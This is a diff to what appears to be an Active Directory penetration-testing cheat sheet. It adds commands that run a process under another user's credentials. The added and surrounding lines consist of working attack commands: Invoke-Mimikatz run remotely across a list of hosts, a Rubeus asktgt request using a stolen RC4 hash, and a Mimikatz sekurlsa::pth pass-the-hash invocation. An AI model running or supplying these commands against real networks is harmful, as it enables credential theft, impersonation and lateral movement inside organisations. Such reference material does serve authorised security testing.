@@ -56,10 +56,21 @@ Invoke-Command -Scriptblock ${function:<function>} -Computername (Get-Content co
 Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content computers.txt)
 ```
 
+### Run as context of other user
 #### Runas other user
 ```
 runas /netonly /user:<DOMAIN>\<USER> cmd.exe
 runas /netonly /user:<DOMAIN>\<USER> powershell.exe
+```
+
+#### Rubeus
+```
+.\rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /dc:<DC IP> /rc4:<HASH>
+```
+
+#### Mimikatz
+```
+mimikatz.exe sekurlsa::pth /domain:<DOMAIN> /user:<USER> /rc4:<HASH>
 ```
 
 ### Remote port forward socat Windows
